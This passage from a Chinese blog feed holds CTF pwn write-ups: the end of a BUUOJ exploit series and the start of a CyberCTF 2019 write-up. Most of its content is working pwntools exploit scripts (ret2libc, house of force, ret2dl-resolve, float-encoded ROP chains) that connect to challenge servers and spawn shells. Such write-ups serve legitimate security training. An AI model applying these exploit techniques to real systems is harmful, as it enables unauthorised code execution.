class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = remote("node3.buuoj.cn",28965)</span><br><span class="line">elf = ELF("bof.dms")</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">offset = 112</span><br><span class="line">pop3_ret = 0x08048629</span><br><span class="line">payload = offset * b"a"</span><br><span class="line">payload += p32(elf.plt['write'])</span><br><span class="line">payload += p32(pop3_ret)</span><br><span class="line">payload += p32(1)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(4)</span><br><span class="line">payload += p32(elf.symbols['main'])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">libc = u32(sh.recvuntil("\xf7")[-4:]) - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh =  libc + lib.search(b'/bin/sh\x00').next()</span><br><span class="line">payload = offset * b"a"</span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(0xdeadbeef)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x99-bctf2016-bcloud"><a href="#0x99-bctf2016-bcloud" class="headerlink" title="0x99 bctf2016_bcloud"></a>0x99 bctf2016_bcloud</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("bcloud_bctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil(">>")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">if size > 0:</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">sh.recvuntil(">>")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil(">>")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./bcloud_bctf_2016")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send("b" * 0x40)</span><br><span class="line">sh.recvuntil("b" * 0x40)</span><br><span class="line">heap_base = (u32(sh.recv(4)) >> 12) << 12</span><br><span class="line">topChunk = heap_base + 0xd8</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(0x40 * "a")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline("\xff" * 0x4)</span><br><span class="line">notesize_addr = 0x0804B0A0</span><br><span class="line">notelist_addr = 0x0804B120</span><br><span class="line">add(notesize_addr - topChunk - 0x10,'')</span><br><span class="line">payload = p32(0x400) * 10</span><br><span class="line">payload = payload.ljust(0x0804B120 - 0x0804B0A0,'\x00')</span><br><span class="line">payload += p32(elf.got['free'])</span><br><span class="line">payload += p32(notesize_addr)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">add(0x400,payload + "\n")</span><br><span class="line">edit(0,p32(elf.plt['puts']) + "\n")</span><br><span class="line">free(2)</span><br><span class="line">__libc_start_main = u32(sh.recvuntil('\xf7')[-4:])</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">edit(0,p32(system) + "\n")</span><br><span class="line">edit(1,payload + p32(binsh) + "\n")</span><br><span class="line">free(3)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node3.buuoj.cn",29792,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x100-cmcc-pwn2"><a href="#0x100-cmcc-pwn2" class="headerlink" title="0x100 cmcc_pwn2"></a>0x100 cmcc_pwn2</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = remote("node3.buuoj.cn",25076)</span><br><span class="line">elf = ELF("pwnme2")</span><br><span class="line">lib = ELF("libc-2.23_x32.so")</span><br><span class="line">pop_ebp_ret = 0x08048680</span><br><span class="line">offset = 0x70</span><br><span class="line">payload = offset * "\xaa"</span><br><span class="line">payload += p32(elf.plt['gets'])</span><br><span class="line">payload += p32(pop_ebp_ret)</span><br><span class="line">payload += p32(0x0804A060)</span><br><span class="line">payload += p32(0x080485CB)</span><br><span class="line">sh.sendlineafter("Please input:",payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline("/flag")</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><hr><h1 id="感想："><a href="#感想：" class="headerlink" title="感想："></a>感想：</h1><h3 id="2019年底了，我还是单身-ﾟДﾟ≡ﾟдﾟ-，一天天看着0202年的到来～～（划重点）"><a href="#2019年底了，我还是单身-ﾟДﾟ≡ﾟдﾟ-，一天天看着0202年的到来～～（划重点）" class="headerlink" title="2019年底了，我还是单身(ﾟДﾟ≡ﾟдﾟ)!?，一天天看着0202年的到来～～（划重点）"></a>2019年底了，我还是单身(ﾟДﾟ≡ﾟдﾟ)!?，一天天看着0202年的到来～～（划重点）</h3><h3 id="啦啦啦-完结撒花-今年的任务算是完成了～-￣▽￣～"><a href="#啦啦啦-完结撒花-今年的任务算是完成了～-￣▽￣～" class="headerlink" title="啦啦啦 完结撒花 今年的任务算是完成了～(￣▽￣～)"></a>啦啦啦 完结撒花 今年的任务算是完成了～(￣▽￣～)</h3><h3 id="这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识-｀・ω・´"><a href="#这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识-｀・ω・´" class="headerlink" title="这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识(｀・ω・´)"></a>这100个EXP算是对得起我今年努力和学习，同时巩固了自己的知识(｀・ω・´)</h3><h3 id="祝BUUOJ越来越好！（￣▽￣）-赵总越来越rich"><a href="#祝BUUOJ越来越好！（￣▽￣）-赵总越来越rich" class="headerlink" title="祝BUUOJ越来越好！（￣▽￣） 赵总越来越rich"></a>祝BUUOJ越来越好！（￣▽￣） 赵总越来越rich</h3><h1 id="南梦小剧场："><a href="#南梦小剧场：" class="headerlink" title="南梦小剧场："></a>南梦小剧场：</h1><h3 id="神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←-←"><a href="#神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←-←" class="headerlink" title="神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←_←"></a>神秘人：BUUOJ刷题之旅续作还有吗，还有木有100个EXP吗？←_←</h3><h3 id="南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？-´；ω；-100个EXP，瞧瞧这是人说的话吗？）"><a href="#南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？-´；ω；-100个EXP，瞧瞧这是人说的话吗？）" class="headerlink" title="南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？ (´；ω；`) 100个EXP，瞧瞧这是人说的话吗？）"></a>南梦：之后的刷题之旅不再公开了，但是当前这篇刷题之旅会一直公开，至于之后有木有100个EXP，那就看我明年的学习成果了（你竟然想让我进一步秃头？？？ (´；ω；`) 100个EXP，瞧瞧这是人说的话吗？）</h3><h3 id="神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？"><a href="#神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？" class="headerlink" title="神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？"></a>神秘人：你天天喊着找女朋友，有女朋友了还会继续刷题吗？</h3><h3 id="南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）"><a href="#南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）" class="headerlink" title="南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）"></a>南梦：有女朋友还打什么CTF，陪女朋友不好吗？（立即打开BUUOJ开始刷题，女朋友什么的最烦了）</h3><h1 id="更新与维护"><a href="#更新与维护" class="headerlink" title="更新与维护"></a>更新与维护</h1><h3 id="后续可能会进一步更新x64和x32的解法（如果存在解的话）"><a href="#后续可能会进一步更新x64和x32的解法（如果存在解的话）" class="headerlink" title="后续可能会进一步更新x64和x32的解法（如果存在解的话）"></a>后续可能会进一步更新x64和x32的解法（如果存在解的话）</h3><h3 id="EXP解释之后可能会进一步完善（-就看我有没有女朋友了-°∀°-ﾉ-）"><a href="#EXP解释之后可能会进一步完善（-就看我有没有女朋友了-°∀°-ﾉ-）" class="headerlink" title="EXP解释之后可能会进一步完善（ 就看我有没有女朋友了(°∀°)ﾉ ）"></a>EXP解释之后可能会进一步完善（ 就看我有没有女朋友了(°∀°)ﾉ ）</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-赛博杯CyberCTF-19年7月</title>
      <link href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/"/>
      <url>/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="赛博杯2019-Write-Up"><a href="#赛博杯2019-Write-Up" class="headerlink" title="赛博杯2019 Write Up"></a>赛博杯2019 Write Up</h1><h2 id="帮朋友打打CTF，挺好的，长长见识"><a href="#帮朋友打打CTF，挺好的，长长见识" class="headerlink" title="帮朋友打打CTF，挺好的，长长见识"></a>帮朋友打打CTF，挺好的，长长见识</h2><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h2 id="0x1-hardpwn"><a href="#0x1-hardpwn" class="headerlink" title="0x1 hardpwn"></a>0x1 <a href="pwn1">hardpwn</a></h2><h3 id="导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖"><a href="#导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖" class="headerlink" title="导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖"></a>导入IDA后，发现需要覆盖运行参数（即argv），因为栈溢出很长且可以覆盖到该参数，所以可以考虑直接覆盖</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = "debug"</span><br><span class="line"></span><br><span class="line">context.arch = "amd64"</span><br><span class="line"></span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line"></span><br><span class="line">sh = 0</span><br><span class="line"></span><br><span class="line">lib = 0</span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"></span><br><span class="line">global sh</span><br><span class="line"></span><br><span class="line">global lib</span><br><span class="line"></span><br><span class="line">if(debug == 1):</span><br><span class="line"></span><br><span class="line">sh = process("./pwn1")</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line"></span><br><span class="line">sh = remote(ip,port)</span><br><span class="line"></span><br><span class="line">payload = '\x00' * 120 +"aaaa" + "\x00"</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"></span><br><span class="line">pwn("47.110.227.208",10001,0)</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/3.png" class="lazyload"></a></p><h2 id="运行后拿到flag-CyCTF-W3lc0me-t0-CyCTF-PWN"><a href="#运行后拿到flag-CyCTF-W3lc0me-t0-CyCTF-PWN" class="headerlink" title="运行后拿到flag: CyCTF{W3lc0me_t0_CyCTF_PWN}"></a>运行后拿到flag: CyCTF{W3lc0me_t0_CyCTF_PWN}</h2><h2 id="0x2-stackpwn"><a href="#0x2-stackpwn" class="headerlink" title="0x2 stackpwn"></a>0x2 <a href="pwn2">stackpwn</a></h2><h3 id="导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2-dl-resolve"><a href="#导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2-dl-resolve" class="headerlink" title="导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2_dl_resolve"></a>导入IDA后，发现没有puts、write等，只有read且有溢出，那么这道题就是典型的考察ret2_dl_resolve</h3><h3 id="利用roputils简化攻击"><a href="#利用roputils简化攻击" class="headerlink" title="利用roputils简化攻击"></a>利用roputils简化攻击</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from roputils import *</span><br><span class="line">from pwn import process</span><br><span class="line">from pwn import gdb</span><br><span class="line">from pwn import context</span><br><span class="line">from pwn import remote</span><br><span class="line">#r = process('./pwn3')</span><br><span class="line">r = remote("47.110.227.208",10003)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">rop = ROP('./pwn3')</span><br><span class="line">offset = 60</span><br><span class="line">bss_base = 0x804a000 + 0x800</span><br><span class="line">buf = rop.fill(offset)</span><br><span class="line">buf += rop.call('read', 0, bss_base, 100)</span><br><span class="line">buf += rop.dl_resolve_call(bss_base + 20, bss_base)</span><br><span class="line">r.send(buf)</span><br><span class="line">buf = rop.string('/bin/sh')</span><br><span class="line">buf += rop.fill(20, buf)</span><br><span class="line">buf += rop.dl_resolve_data(bss_base + 20, 'system')</span><br><span class="line">buf += rop.fill(100, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/1.png" class="lazyload"></a></p><h2 id="0x3-floatpwn"><a href="#0x3-floatpwn" class="headerlink" title="0x3 floatpwn"></a>0x3 <a href="pwn3">floatpwn</a></h2><h3 id="这题考察了确定浮点寄存器通过movss写入内存时的数值"><a href="#这题考察了确定浮点寄存器通过movss写入内存时的数值" class="headerlink" title="这题考察了确定浮点寄存器通过movss写入内存时的数值"></a>这题考察了确定浮点寄存器通过movss写入内存时的数值</h3><h3 id="方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之后可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。"><a href="#方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之后可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。" class="headerlink" title="方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之后可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。"></a>方法：只能人工二分法一次一次去尝试，然后发现小数点后45位之后可以忽略不计，真正开始有意义的数值在小数点后45位开始。然后求出对应的n使得写回内存时是我想要的数值，从而构造ROP链。但是想构造ROP链之前需要实现无限写，所以输入size时，可以考虑输入负数，实现无符号整数溢出，从而无限写。因为控制写入数据位置的i变量位于栈空间底部，所以要使得写到i里的数据为10到12即可，因为可以考虑直接略过ebp，直接修改rip。</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def inputFloat(num):</span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(num)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline()</span><br><span class="line">def inputRop(num):</span><br><span class="line">num = str(num)</span><br><span class="line">num = num.rjust(45,"0")</span><br><span class="line">num = num.ljust(0x62,"0")</span><br><span class="line">inputFloat("0." + num)</span><br><span class="line">inputFloat("0")</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./pwn2")</span><br><span class="line">lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("libc6_2.27-3ubuntu1_amd64.so")</span><br><span class="line">#puts 5879714 0x400640</span><br><span class="line">#pop_rdi 5881041 0x4009f3</span><br><span class="line">#__libc_start_main_got 8822026 0x601038</span><br><span class="line">#main 5880847 0x400969</span><br><span class="line">#start 5879938 0x4006E0</span><br><span class="line">#call vul 5880867 0x400977</span><br><span class="line">#vul 5880653 0x4008DE</span><br><span class="line">#read 5879781 0x400670</span><br><span class="line">#pop_rsi_r15_ret 5881038 0x4009f1</span><br><span class="line">#read_got 8822014 0x601030</span><br><span class="line">#binsh 8822106 0x601071</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline("-1.9999")</span><br><span class="line">for i in range(0,13):</span><br><span class="line">inputFloat("111")</span><br><span class="line">inputFloat("13")</span><br><span class="line">inputFloat("13")</span><br><span class="line">inputFloat("0." + "0" * 43 + "23")#0x11</span><br><span class="line">inputFloat("0." + "0" * 43 + "23")#fake</span><br><span class="line"></span><br><span class="line">#rip = 0x4009f3</span><br><span class="line">#pop_rdi_ret</span><br><span class="line">inputRop(5881041)</span><br><span class="line"></span><br><span class="line">#__libc_start_main got</span><br><span class="line">inputRop(8822026)</span><br><span class="line"></span><br><span class="line">#puts_plt</span><br><span class="line">inputRop(5879714)</span><br><span class="line"></span><br><span class="line">#pop_rdi_ret</span><br><span class="line">inputRop(5881041)</span><br><span class="line">inputRop(0)</span><br><span class="line"></span><br><span class="line">#pop_rsi_r15_ret</span><br><span class="line">inputRop(5881038)</span><br><span class="line">inputRop(8822106)</span><br><span class="line">inputRop(0)</span><br><span class="line"></span><br><span class="line">#read_plt</span><br><span class="line">inputRop(5879781)</span><br><span class="line"></span><br><span class="line">#pop_rdi_ret</span><br><span class="line">inputRop(5881041)</span><br><span class="line">inputRop(0)</span><br><span class="line"></span><br><span class="line">#pop_rsi_r15_ret</span><br><span class="line">inputRop(5881038)</span><br><span class="line">inputRop(8822014)</span><br><span class="line">inputRop(0)</span><br><span class="line"></span><br><span class="line">#read_plt</span><br><span class="line">inputRop(5879781)</span><br><span class="line"></span><br><span class="line">#pop_rdi_ret</span><br><span class="line">inputRop(5881041)</span><br><span class="line">inputRop(8822106)</span><br><span class="line"></span><br><span class="line">#read_plt</span><br><span class="line">inputRop(5879781)</span><br><span class="line"></span><br><span class="line">#input()</span><br><span class="line">sh.recvuntil("plz input your float:")</span><br><span class="line">sh.sendline("0")</span><br><span class="line">sh.recvuntil("do you want to continue?(y/n)")</span><br><span class="line">sh.send("n")</span><br><span class="line"></span><br><span class="line">__libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">sh.sendline("/bin/sh\x00")</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.sendline(p64(system))</span><br><span class="line">log.success("__libc_start_main: " + hex(__libc_start_main))</span><br><span class="line">log.success("system: " + hex(system))</span><br><span class="line">log.success("binsh: " + hex(binsh))</span><br><span class="line">log.success("libc: " + hex(libc))</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("47.110.227.208",10002,0)</span><br></pre></td></tr></tbody></table></figure></div><p><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/2.png" class="lazyload"></a></p><h2 id="0x4-codepwn"><a href="#0x4-codepwn" class="headerlink" title="0x4 codepwn"></a>0x4 <a href="pwn4">codepwn</a></h2><h3 